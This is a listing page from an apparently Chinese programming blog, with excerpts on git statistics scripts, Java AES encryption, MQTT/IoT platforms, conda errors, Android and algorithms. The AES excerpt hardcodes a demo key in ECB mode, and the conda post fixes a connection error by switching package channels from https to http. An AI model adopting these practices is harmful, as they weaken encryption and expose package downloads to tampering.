			python脚本按照时间和作者统计git代码量写入Excel
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		python脚本按时间统计git代码量写入Excel 上篇文章虽说数据也可以出来，但是都写到了txt文件中，此次直接写入Excel，gitpython没弄明白，用的shell命令获取的数据，请看官自取，有问题可以留言，欢迎交流
目录 python脚本按时间统计git代码量写入Excel1、目录结构介绍1.1 前期准备1.2 code.xlsx的展示1.3 结果展示 2、代码2.1 python依赖2.2 config.ini 配置文件2.3 main.py 代码 1、目录结构介绍 git_code_count：为最外层目录
git_code：是放代码的，git clone 到这级目录中
code.xlsx：是读取仓库地址和分支
config.ini：配置文件
main.py：脚本文件
1.1 前期准备 整理git地址和分支到excel文件中windows系统需要一个bash环境，这里用git最好是git地址，ssh证书提前放入git远程仓库中 1.2 code.xlsx的展示 该sheet本文中是test
1.3 结果展示 2、代码 2.1 python依赖 # python 3.6.5 # openpyxl==3.0.10 # 其他用的自带库 2.2 config.ini 配置文件 ; 配置文件 ; config.ini [ext] ; 统计文件格式 Ext = .java|.xml|.gsp|.groovy|.js|.css|.vue|.html|.cs|.h|.m|.swift [git] ; git的执行程序路径，linux系统可以不需要 GitExe = D:/soft/Git/bin/bash.exe [pwd] ; 代码目录路径 pwd = D:\\python_project\\python_script\\langzhi_workspace\\git_code_count\\git_code\\ [time] ; 统计代码的截止时间 DeadLine = 2022-06-30 23:59:59 ; 统计代码的开始时间 StartLine = 2022-06-01 00:00:00 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/262e912d5b0b7627fbbba12ee22d565b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/39f0390a3e171648e90fb299bbb088fa/" rel="bookmark">
			Java加密与安全 —— 对称式加密与非对称式加密的对比
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		对称式加密 一. 对称加密算法就是传统的用一个密码进行加密解密。
常用的对称加密算法有：
密钥长度直接决定加密强度
工作模式和填充模式可以看成是对称加密算法的参数和格式选择。
注意：DES算法由于密钥过段。可以在短时间内被暴力破解，现在已经不安全了。
二. AES加密
AES加密比较常见的工作模式是ECB 和 CBC。
ECB模式
使用ECB模式加密和解密：
【步骤】：
根据算法名称/工作模式/填充模式获取Cipher实例；根据算法名称初始化一噶SecretKey实例，密钥必须指定长度；
3 . 使用SercetKey初始化Cipher实例，并设置加密或解密模式；传入明文或密文，获得密文或明文。 import java.security.*; import java.util.Base64; import javax.crypto.*; import javax.crypto.spec.*; public class Main { public static void main(String[] args) throws Exception { // 原文: String message = "Hello, world!"; System.out.println("Message(原始信息): " + message); // 128位密钥 = 16 bytes Key: byte[] key = "1234567890abcdef".getBytes(); // 加密: byte[] data = message.getBytes(); byte[] encrypted = encrypt(key, data); System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/39f0390a3e171648e90fb299bbb088fa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c51f64c4df4945b967a25f27c3d6f310/" rel="bookmark">
			使用pandas对excel追加列数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 在Excel文件的最后再增加一列：
import json import pandas as pd df=pd.read_json('./tianqi.json',lines=True,encoding='utf-8')#读取数据，按行读取 #print(df) c=df.to_excel('./hu.xlsx') dr = pd.read_excel('./hu.xlsx') col_name=dr.columns.tolist()#将列名全部提取出来存放在列表里 col_name.append('新的一列')#将新增的列添加到最后 # DataFrame.reindex() 对原行/列索引重新构建索引值 dr=dr.reindex(columns=col_name) q = ['1','2','3','4','5','6','7','8','9'] dr['新的一列'] = q #把新列的数据放到指定的列名下 dr.to_excel('./aaa.xlsx')#将整个dr写入excel 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4b0314fa17be691c542052d1f6701daa/" rel="bookmark">
			HLS实验一--乘法器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		HLS实验一--乘法器 前言流水线使用到的函数1.排队函数2.没有返回类型的排队函数3.开启组件函数参考文章 一、直接调用组件二、使用流水线的方法三、两种模式的对比1.仿真2.报告 前言 本次实验使用了两种方法，分别是直接调用组件和以流水线的方式调用组件。
流水线使用到的函数 1.排队函数 ihc_hls_enqueue(void *retptr, void *funcptr,/*function arguments*/) 参数：
retptr：返回值
funcptr：将要调用的HLS component
这个函数对HLS组件的一次调用进行排队。返回值存储在第一个实参中，该实参应该是指向返回类型的指针。在调用ihc_hls_component_run_all()之前，组件不会运行。
2.没有返回类型的排队函数 ihc_hls_enqueue_noret(void* funcptr,/*function arguments*/) 参数：
funcptr：将要调用的HLS component
这个函数对HLS组件的一次调用进行排队。当HLS组件的返回类型为void时，应该使用这个函数。在调用ihc_hls_component_run_all()之前，组件不会运行。
3.开启组件函数 ihc_hls_component_run_all(void* funcptr) 参数：
funcptr：将要调用的HLS component
这个函数接受一个指向HLS组件函数的指针。组件的所有排队调用在运行时将被推入，当组件能够接受新的调用时，HDL模拟器就能以最快的速度运行。
参考文章 https://blog.csdn.net/qq_42585108/article/details/120614492
一、直接调用组件 #include&lt;HLS/stdio.h&gt; #include&lt;HLS/hls.h&gt; #include&lt;assert.h&gt; #include&lt;stdlib.h&gt; component int multiplication(int a,int b) { return a * b; } int main() { srand(0); int i, x[10] = { 0 }, y[10] = {0}, z[10] = { 0 }; for (i = 0; i &lt; 10; i++) { x[i]= rand() % 10; y[i]= rand() % 10; z[i]= multiplication(x[i], y[i]); printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4b0314fa17be691c542052d1f6701daa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/47d61817d59eb3b528868788837aa14c/" rel="bookmark">
			EMQX &#43; IoTDB：存储 MQTT 消息到时序数据库
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		IoTDB 是最早由清华大学发起的开源时序数据库项目，现已经是 Apache 的顶级项目。IoTDB 可以为用户提供数据收集、存储和分析等服务。由于其轻量级架构、高性能和高可用的特性，以及与 Hadoop 和 Spark 生态的无缝集成，满足了工业 IoT 领域中海量数据存储、高吞吐量数据写入和复杂数据查询分析的需求。
EMQX 是一个大规模扩展、可弹性伸缩的开源云原生分布式物联网消息中间件，由开源物联网数据基础设施软件供应商 EMQ 映云科技 发布。EMQX 可以高效可靠地处理海量物联网设备的并发连接，并且内置了强大的规则引擎功能，用以对事件和消息流数据进行高性能地实时处理。规则引擎通过 SQL 语句提供了灵活的 "配置式" 的业务集成方案，简化了业务开发流程，提升了易用性，降低了用户的业务逻辑与 EMQX 的耦合度。
本文将介绍如何使用 EMQX 规则引擎的 MQTT 数据桥接功能，接收 MQTT 客户端发送的数据，并实时插入到时序数据库 IoTDB。
准备工作 本文示例中用到的软件和环境：
操作系统： Mac OSXIoTDB： Binary 包（Server），版本 0.12.4MQTT 服务器： EMQX 开源版 v4.3.11MQTT 客户端软件：MQTTX v1.6.0 IoTDB 安装 首先我们需要从 IoTDB 官方页面下载 IoTDB Server（单机版）的二进制包。
下载完成之后解压，进入解压后的目录：
% ls LICENSE README.md RELEASE_NOTES.md data ext licenses sbin NOTICE README_ZH.md conf docs lib logs tools 要启用 IoTDB 的 MQTT 协议支持，需要改动 IoTDB 的配置文件 conf/iotdb-engine.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/47d61817d59eb3b528868788837aa14c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/78bd6ed361d5a3165455f8b37b62840c/" rel="bookmark">
			千万级车联网 MQTT 消息平台架构设计
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 随着整个汽车出行领域新四化（电气化、智能化、网联化和共享化）的推进，各个汽车制造厂商正逐步构建以智能驾驶和智能网联为核心的车联网系统。新一代的车联网系统对于底层消息采集、传输和处理的平台架构提出了更高的要求。
本系列专题的上篇文章《车联网场景中的 MQTT 协议》中我们已经提到，MQTT 协议是目前最适合车联网场景数据平台搭建的通信协议。基于此，本文中我们将继续讨论车联网场景中的 MQTT 消息采集与传递，以及如何构建一个千万级车联网 MQTT 消息平台，以期为正在进行车联网业务的企业用户提供平台架构设计参考。
车联网的基础：消息采集与传递 车联网传输协议的演进 众所周知，车联网（vehicle-to-everything，V2X）是指车与云、车与网、车与车、车与路、车与人、车与传感设备等交互，实现车辆与公众网络通信的动态移动通信系统，是为了满足与车有关的每一个环节中的效率、安全、管理等元素而建立起的异构通信网络。而运行于其中的通信协议就成为车联网系统建设的关键和核心。
在车联网发展的历程中，主要有两种主流的通信技术，对车联网整体发展起到了推动作用：
DSRC（DeDICated Short Range CommunICation，专用短程通信）：1992 年由美国材料试验学会 ASTM 针对 ETC 的业务场景研发而出，后经多年完善和迭代，演变为 IEEE(802.1X) 车联网通信技术标准。在相当长的一段时间里，DSRC 技术是国际汽车主流生产和消费市场使用的主流车联网通信协议。
C-V2X（Cellular Vehicle to Everything，蜂窝车联网通信）：C-V2X 依托现有的蜂窝基站，除了支持 PC5的直连通信，RSU、车辆均可通过 4/5G 信道（采用 Uu 接口）与 V2X 平台相连，实现车路协同通信。较之 DSRC，C-V2X 技术上更优，它增强通信的安全性与保密性，支持高网络容量，可支持高带宽和大数据量需求。
DSRC 和 C-V2X 技术的竞争非常激烈，两者都希望能够成为主流车联网通信标准。目前，我国拥有最完善的 5G 通信网络的基础设施，因此更倾向于采用 C-V2X(LTE-V 、5G-V2X)通信技术，通过 V2X 车路系统+单车智能系统的体系化建设，实现基于自动驾驶的新一代车联网架构。
消息平台建设对于车联网的意义 在车联网建设高速发展的今天，所有的主机厂业已形成了一个共识: 车联网建设的目的不是为了联网而联网，也不是为了车载娱乐而联网，联网是为了数据。有了车联网，就有了数据。有了数据，辅以完整的数据治理和应用体系，就有了一切。
而这个业务的目标数据，也不仅仅限于车端的相关数据。在 V2X 框架中，需要解决车与车（V2V）、车与路（V2R）、车与网（V2I）、车与云（V2C）、车与人（V2H）等的互联互通，实现针对车、路、云、网、人的全面数据采集和分析。基于 5G 的 C-V2X 协议和通讯方式，为整个系统的建设提供基础能力保障。
从传统的 OTA 应用到智能座舱、高精地图适配、厘米级定位、车机端长连接、手机端消息采集、车路云图、车路协同等众多新型智能应用场景，车联网业务对于消息平台和数据处理系统的需求已从原始的车云扩展为人-车-路-网-云的整体架构建设，也因此对整个消息平台的建设提出了更高的要求。
如何建设一个海量连接、高并发吞吐、低时延的消息通信和传输系统架构，来保证整个系统的泛在性、便利性、高可用性、可靠性、安全性和高并发性，就成为了基于自动驾驶和车路协同场景下新一代车联网系统建设的关键所在。
千万级车联网消息平台架构设计 接下来我们将以 EMQ 的车联网消息平台和数据处理整体解决方案为例，介绍如何构建一个千万级的车联网消息平台。
业务挑战 车机、路测单元和手机端系统安全接入
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/78bd6ed361d5a3165455f8b37b62840c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3633b772a6c9353fc060283bd5e59a2f/" rel="bookmark">
			MQTT 协议在石油行业数据采集中的应用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MQTT 协议概述 MQTT 是用于物联网的标准消息传递协议。它被设计为一种非常轻量级的发布/订阅消息传送，非常适合以较小的代码占用量和网络带宽连接远程设备。MQTT 协议具有以下特点：
轻巧高效：MQTT 客户端非常小，需要设备资源少。MQTT 消息头很小，可以优化网络带宽。双向通讯：MQTT 允许设备到云之间以及云到设备之间的消息传递。可靠的消息传递：MQTT 具有 3 种定义的服务质量级别：0-最多一次，1-至少一次，2-恰好一次，可根据业务场景保证消息传递的可靠性。支持不可靠网络：许多物联网设备通过不可靠的蜂窝网络进行连接。MQTT 对持久性会话的支持减少了将客户端与代理重新连接的时间。安全：MQTT 使您可以轻松地使用 TLS 加密消息并使用现代身份验证协议（例如OAuth）对客户端进行身份验证。 如今，MQTT 被广泛应用于汽车、制造业、电信、石油和天然气等行业。
本系列文章将详细解读 MQTT 协议在各行业实际应用场景中是如何发挥作用的。
石油行业中的物联网业务 随着物联网技术迅猛发展，新型信息传感设备以及各类有线、无线网络技术在石油勘探、生产与储运环境中逐渐普及使用。石油石化企业希望利用物联网技术实现对油田终端设备的远程管理，优化物联网数据存管用的效率、安全性和可扩展性。
在石油生产与运输储存场景中，通过工业边缘网关将传统工业总线协议与 PLC 协议转化成物联网 MQTT 协议，将现场实时数据传递到数据中心，以实现对现场数据远程采集与集中化管理，是目前石油石化企业生产监控技术改造的重点方向之一。
传统石油生产数据采集场景痛点 传统采油厂通过现场专用无线或者有线网络，将油井中的油压、油温、载荷、电量等数据实时传送到 RTU 或者 PLC 中，再通过本地 SCADA 系统进行汇聚后存储在生产作业区或者联合站的控制室内的数据库。厂区中心机房需要定期从场站控制机房的数据库中同步数据，实现对多个作业区的数据汇聚。
随着企业对实时数据消费需求越来越高，对边缘数据库的访问频率要求也随之增加，在实际运行过程中逐渐暴露出以下问题：
场站数据采集与数据存储软硬件老化，更新成本高；
随着采集数据量不断增加，整体性能开始无法满足日益增长的数据需求；
厂区无法得到实时数据，对场站的实时管理监控能力不足；
现场技术维护人员工作强度大，人工成本高。
基于 MQTT 协议的石油生产数据采集方案 得益于网络技术在石油行业中的普及，油田作业区与厂区之间已基本实现了网络联通，为物联网技术的引入提供了基础网络条件。各类生产数据也得以通过 MQTT 协议获得采集汇聚与进一步处理，充分发挥其价值。
以 EMQ 云边数据采集方案为例：
各类工业协议转换为 MQTT 实现统一接入 在场站端，通过工业数据采集网关软件 Neuron 将现场采用 Modbus-RTU、Modbus-TCP 协议的仪表数据转换成高可靠轻量化的 MQTT 协议，再将实时数据通过专网将 MQTT 协议推送到厂区中心机房的数据接入平台 EMQX。
对数据进行过滤处理并推送 部分冗余数据或者其他系统数据，可以通过部署在场站端的轻量化数据处理软件 eKuiper 将数据进行过滤处理，将有意义的数据推送到厂区中心机房的数据接入平台 EMQX。
采集数据实时移动至数据库以供业务应用 厂区中心机房的数据接入平台 EMQX 将实时数据统一接入后存储到中心机房的数据库中，各种业务应用可以对接数据库拉取相关业务数据。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3633b772a6c9353fc060283bd5e59a2f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/54a81616f26f2a833f1ed0d18bc01cbc/" rel="bookmark">
			MQTT 赋能工业 PLC 数据采集与应用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MQTT 协议概述 MQTT 是用于物联网的标准消息传递协议。它被设计为一种非常轻量级的发布/订阅消息传送，非常适合以较小的代码占用量和网络带宽连接远程设备。MQTT 协议具有以下特点：
轻巧高效：MQTT 客户端非常小，需要设备资源少。MQTT 消息头很小，可以优化网络带宽。双向通讯：MQTT 允许设备到云之间以及云到设备之间的消息传递。可靠的消息传递：MQTT 具有3种定义的服务质量级别：0-最多一次，1-至少一次，2-恰好一次，可根据业务场景保证消息传递的可靠性。支持不可靠网络：许多物联网设备通过不可靠的蜂窝网络进行连接。MQTT 对持久性会话的支持减少了将客户端与代理重新连接的时间。安全：MQTT 使您可以轻松地使用 TLS 加密消息并使用现代身份验证协议（例如OAuth）对客户端进行身份验证。 如今，MQTT 被广泛应用于汽车、制造业、电信、石油和天然气等行业。
本系列文章将详细解读 MQTT 协议在各行业实际应用场景中是如何发挥作用的。
当前的工业 PLC 数据采集 PLC 即可编程逻辑控制器，是工业自动化领域的核心设备，广泛应用于各个工业领域。从 PLC 问世至今，一直表现出强大的生命力和高速增长态势，2020 年全球 PLC 市场的销售量已经达到了百亿 RMB 级别。
德国产业界将 PLC 在生产工艺自动化过程中的广泛应用定义为「工业 3.0」，其代表了各类数控机床、工业机器人等单机自动化设备在生产环节的推广及应用。而将无处不在的传感器、PLC、智能控制系统、通信设施通过 ICT 技术形成一个智能网络，使人与人、人与机器、机器与机器及服务与服务之间能够互联，则是「工业 4.0」的核心要义。人、物、数据通过物联网技术进行流程再造，由单机智能升级为万物互联的智能。
实现工业场景下的万物互联离不开对工业自动化设备的数据采集。其中 PLC 常用的工业现场总线协议就多达数十种，此外各大 PLC 厂商基本都有各自的私有总线协议。由于现场总线种类繁多各异，传统的工业 PLC 数据采集一般通过在设备侧部署边缘网关的方式进行：使用边缘网关将各类协议统一，再将 PLC 数据采集及汇聚，转发到 IoT 平台，以此实现设备间的数据互联。
然而，基于边缘网关的数据采集方式，存在以下不足：
需要部署边缘网关硬件，并进行软件配置，需要投入额外的成本。边缘网关数据采集频率只能达到秒级，大部分边缘网关上报物联网平台的数据格式无法修改。PLC 与边缘网关间通讯出现问题，会造成数据采集缺失，无法为高级应用提供有效数据支撑。 新趋势：PLC 集成 MQTT 协议 随着物联网、大数据及人工智能的迅速发展，自动化厂商也在加速推进物联网战略，推出各自的 IoT 和数字化解决方案。作为主流物联网协议的 MQTT 协议成为各自动化设备厂商关注的重点。为了加速实现互联互通的工业物联网，各大厂商纷纷开始在 PLC 中集成 MQTT 协议，以方便 PLC 数据的采集。
以几个主流厂商为例：
西门子已经将 MQTT 客户端功能封装成 PLC 的库文件，通过西门子 S7-1200、S7-1500 可以实现基于 MQTT 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/54a81616f26f2a833f1ed0d18bc01cbc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2ce232eedfcf1322b3836d07cd182eaf/" rel="bookmark">
			使用IDEA作为开发工具，修改完项目中部分文件代码后，不起作用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 （一）本篇博客解决的问题 不知道有没有读者遇到这样的问题：使用IDEA作为开发工具的时候，我们对项目的某一个XML配置文件或者是application文件做了细小的修改，然后重启了项目，但是项目没有按照我们预想的那样运行，还是和没有修改前是一样的。也就是说修改的代码没有起作用。这里保证我们的代码没有错误，逻辑也没有错误。
我使用的IDEA版本是：2021.1.2的，不一样的IDEA版本，功能所在的位置可能会有细微的差别。
（二）解决方法 程序运行，会生成target文件夹，运行的是target里面的文件结构；
如果我们的项目是一个Maven项目，那么可以先使用下面的方法：
1、Maven命令 clean 然后在compile 操作界面如下图所示：
但是： 有时候上面的方法操作完以后不起作用，这我是遇到过的，那么还可以使用下面的两种方法：
2、右键项目名然后点击 maven 点击Reload project 3、点击导航栏 File 然后点击 invalidate(驳斥) Caches 在选择清除缓存并且重启；此方法的截图如下所示： 直接选择 Invalidate and Restart 就可以了。
上述三个方法如果都尝试了，一般都是可以解决问题的。
但是，但是：有那么1%的概率，问题还是没有解决。那么你可以直接重启电脑，哈哈哈哈，开个玩笑。 还可以使用下面最后一种暴力稍笨的方法：
4、终极方法： 将有改动的文件手动复制粘贴替换到到target 文件夹下对应的位置上。然后启动项目。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6c1e41f2fb73125aaed16e1bb903cb46/" rel="bookmark">
			win10下 Anaconda使用conda连接网络出现错误(CondaHTTPError: HTTP 000 CONNECTION FAILED for url）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参考博文：Conda Install Package Error_AdaWong_Corner的博客-CSDN博客
win10系统下，在安装anaconda后，执行conda upgrade --all时报错如图。
按照博客里操作的，设置清华镜像，去c盘删除文件里的defaul ，但都是不可以。
结果把链接的https修改成http就可以了。
原因应该是不支持https，将https 改为http即可
该方法供大家参考。 环境问题有时候真的令人头大，如果能帮助到大家，很荣幸。也可以多多支持呀！感受一下快乐
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2dd54aee896263bfe18b1189da09fb17/" rel="bookmark">
			回溯法解决 八皇后问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		什么是八皇后 八皇后问题（英文：Eight queens），是由国际象棋棋手马克斯·贝瑟尔于1848年提出的问题，是回溯算法的典型案例。
问题表述为：在8×8格的国际象棋上摆放8个皇后，使其不能互相攻击，即任意两个皇后都不能处于同一行、同一列或同一斜线上，问有多少种摆法。高斯认为有76种方案。1854年在柏林的象棋杂志上不同的作者发表了40种不同的解，后来有人用图论的方法解出92种结果。如果经过±90度、±180度旋转，和对角线对称变换的摆法看成一类，共有42类。计算机发明后，有多种计算机语言可以编程解决此问题。
这个国王好居然有八个皇后 八皇后问题规则 以下是一个棋盘，假设以左上角为原点（1，1），向右为y轴，向下为x轴。八皇后的规则是当放了一颗棋子后，这一横排，竖排，左右斜排都不能再放置了。
如图，假设在(3，4)放一颗棋子。
那么，在(1,2),(1,4),(1,6),(2,3),(2,4),(2,5),(3,1),(3,2),(3,3),(3,4),(3,5),(3,6),(3,7),(3,8),(4,3),(4,4),(4,5),(5,2),(5,4),(5,6),(6,1),(6,4),(6,7),(7,4),(7,8),(8,4)都不能再放置棋子了。
然后请问当8个棋子都能按上去规则放完，有多少种情况。
以下，就是解法的其中之一，以每一列(y)轴来计，记为: 1 7 4 6 8 2 5 3
解决思路 很明显，这有点类似于数独问题。
解法思路就是：从第一行开始(x轴) 依次搜这行的每一列(y轴) ，如果该坐标没有被标记过，那么记录(1,1)放下了棋子，并且这行，这列，斜排都做一个标记。然后就先在这放第一颗棋子，接下来搜索第二行。
同理，依次搜第二行的每一列，可以得知在放(1,1)的时候，(2,1),(2,2)是不能再放的，所以只能先放(2,3)，然后与(2,3)有关的点做标记。接下来搜第三行.....
当某一行，出现全部都不能放的时候，就说明之前的假设有问题，所以就必须返回上一行，在上一行可行的下一个格子放棋子，(若放不了，那么还得再返回）然后继续按上述要求搜索....
当8个棋子都能放完的时候，说明有一种方案成立了，但是还没完，所以把这种方案做记录，然后返回继续搜....
直到所有情况都搜完，那么程序结束。
思路是这样，但是代码怎么去实现呢？
很明显，这是典型的回溯法。
因此，套用回溯法的模板。
void Backtrack(原参数区间/或者参数) { if(达到目的/或者撞到“南墙”) { 存放结果;//或者输出结果,输出最好调用新函数 return; } 进行一些操作(根据实际情况可省去); for(int i=1;i&lt;=子区间个数(换句话说,也就是父亲节点的度);i++) {//或者子参数个数 if(没被记录) { 做记录;//已经搜过就不再搜了 Backtrack(子区间或者下个搜索的参数); //调用子区间或者参数 销毁记录;//搜完,或者撞到南墙,就销毁记录 } } } 按照上述思路，是从每一行开始，依次搜每一列。所以大致确定：
代码 int hang[N],lie[N],dia1[N*2],dia2[N*2]; //hang记录每一行,lie记录每一列 //dia1记录左斜,dia2记录右斜 const int n=8;//8皇后 vector&lt;int&gt;queen;//queen代表每一组的8个数 vector&lt;vector&lt;int&gt;&gt;ans;//ans储存最终结果,ans[1]代表第一组,ans[2]代表第二组结果 //做记录 void record(int x,int y) { queen.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2dd54aee896263bfe18b1189da09fb17/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ee54f2b2991107c114706a6d5d161a83/" rel="bookmark">
			在 Android 中使用 Glide 库下载和显示图像
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 今天，我们为我们一整天所做的每一项任务都提供了移动应用程序。我们喜欢使用更具交互性和更好 UI 的应用程序。而让 App 更具交互性的最重要的事情是图像的使用。
是的，图像在使应用程序的 UI 更具交互性和用户友好性方面发挥着重要作用。所以，作为一名 Android 开发者，我们应该注意在我们的 App 中使用图片。我们应该处理图像的各个方面，例如加载缓慢、图像无响应、内存问题等等。如果您不处理这些方面，那么您的应用程序会给您的用户留下不好的印象。
为了管理 Android 应用程序中使用的图像的各个方面，Google 在 Google I/O 2014 中推荐使用Glide 库。因此，在本博客中，我们将学习如何使用Glide 库来下载图像并使用它在我们的应用程序中。这篇文章的大纲如下：
什么是Glide？Glide 库的特点在 Android 中使用 Glide更多功能结论 什么是Glide？ 更准确的说，Glide是一个面向 Android 的开源媒体管理框架，它将媒体解码、内存和磁盘缓存以及资源池封装到一个简单易用的界面中。
换句话说，Glide Library 是一个流行的用于图像下载和缓存的 android 库，由bumptech开发。它基本上专注于平滑滚动。很多时候，发现如果你尝试加载一个非常大尺寸的图像，那么你的应用程序将不会流畅。滚动不会很流畅，但是通过使用 Glide 你可以摆脱这个问题。
Glide 的主要焦点是使滚动尽可能平滑和快速。但 Glide 也可用于获取、调整大小和显示远程图像。
Glide 库的特点 Glide 支持大量的功能。其中一些是：
GIF 的使用：在 Glide 中，您也可以使用 GIF。将静态图像放入应用程序的时代已经一去不复返了。现在，您可以使用 Glide 使用 GIF。磁盘缓存： Glide 从给定的 URL 下载图像，将其调整为要显示图像的图像视图的大小，并将其存储到磁盘缓存中。如果你将同一张图片放在两个不同的 Image Views 中，Glide 将存储同一张图片的两个不同副本。这将增加磁盘缓存大小，但会提高处理速度。缩略图支持：使用 Glide，我们可以同时将多个图像加载到同一个视图中，即我们可以将缩略图添加到我们的图像视图中。定制： Glide 最好的地方在于，它提供了各种配置和定制选项。因此，您可以根据需要更改 Glide 库。 在 Android 中使用 Glide 在这篇博尔格的他的部分中，我们将研究使用 Kotlin 在 Android 中实现 Glide。要在您的 Android 应用程序中使用 Glide 库，首先，将 Glide 库依赖项添加到您的app/build.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ee54f2b2991107c114706a6d5d161a83/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5e8852345c6e33a2c02613cb118e28a4/" rel="bookmark">
			Springboot集成canal 1.1.5简单实践
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一. Canal简介 主要用途是基于 MySQL 数据库增量日志解析，提供增量数据订阅和消费
基于日志增量订阅和消费的业务包括：
1.数据库镜像 2.数据库实时备份 3.索引构建和实时维护(拆分异构索引、倒排索引等) 4.业务 cache 刷新 5.带业务逻辑的增量数据处理 当前的 canal 支持源端 MySQL 版本包括 5.1.x , 5.5.x , 5.6.x , 5.7.x , 8.0.x
canal 工作原理：
canal 模拟 MySQL slave 的交互协议，伪装自己为 MySQL slave ，向 MySQL master 发送dump 协议MySQL master 收到 dump 请求，开始推送 binary log 给 slave (即 canal )canal 解析 binary log 对象(原始为 byte 流) 二.服务端环境准备（Liunx） 1.开启Mysql Binlog 写入功能，配置 binlog-format 为 ROW 模式 修改mysql my.cnf文件 [mysqld] log-bin=mysql-bin # 开启 binlog binlog-format=ROW # 选择 ROW 模式 server_id=1 # 配置 MySQL replaction 需要定义，不要和 canal 的 slaveId 重复 （因为cancal是作为从库监听主库） 查看Binlog开启状态，登陆mysql后： ON为开启 show variables like '%log_bin%'; 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5e8852345c6e33a2c02613cb118e28a4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9cc76dd9224989198d3505c09318b29e/" rel="bookmark">
			Android adb 安装apk程序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 ADB简单介绍安装命令安装失败情况adb 安装测试包adb 安装卸载的所有命令摘要 前言 多数情况下，用户都是从应用商店或某网页下载apk后从手机上直接安装apk文件，在调试或下载到电脑上时候，我们就可以直接通过adb安装到手机。在测试小伙伴测试过程中也可能直接收到开发小伙伴直接发来的apk，有些小伙伴通过电脑微信或qq传递手机微信或手机qq后安装，此外也可以通过adb 直接安装。
Android adb 启动APP
Android代码安装apk程序
ADB简单介绍 adb 是Android 开发调试工具，在…\Android\Sdk\platform-tools目录中
单独下载sdk解压或安装就可以得到，我们在环境变量中添加…\Android\Sdk\platform-tools后，在命令行窗口就可以使用 adb 命令了。没添加环境变量需要把整个路径带上。
安装命令 adb install -r app.apk
覆盖安装的话最好都带上-r，不是覆盖可以不用带-r
操作：
win + r 或直接打开运行，输入cmd
输入adb install 然后将apk文件拖入命令行窗口，回车
安装成功
安装失败情况 签名不一致，由于debug和release使用的签名不一致，这种情况下，可以先卸载已安装的版本，可手动卸载或 adb 卸载adb uninstall 包名
有些手机需要在安装过程在手机上确认安装（小米系列）开启调试模式
设置-系统-开放人员选项-开启开放人员选项和usb调试
adb 安装测试包 用 -t ，详细如下：
adb install -t app-debug.apk Android studio 3.0后 ，编译debug版本时，默认在manifest的application里面加入android:testOnly="true"属性。因此真机上手动安装是失败的，adb install app-debug.apk也是失败的。要使用 adb install -t app-debug.apk。
另外的解决办法：在项目中的全局配置gradle.properties文件中设置：android.injected.testOnly=false，这样就避免debug版本手动安装失败的问题，这种主要是解决某些场景的测试需要。
adb 安装卸载的所有命令摘要 install [-lrtsdg] [--instant] PACKAGE push a single package to the device and install it install-multiple [-lrtsdpg] [--instant] PACKAGE.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9cc76dd9224989198d3505c09318b29e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/98976ac31379e85a63a73f5802b0b9af/" rel="bookmark">
			【线程同步】使用 C&#43;&#43; 实现 waitgroup
			</a>
		</h2>
		
	</header>
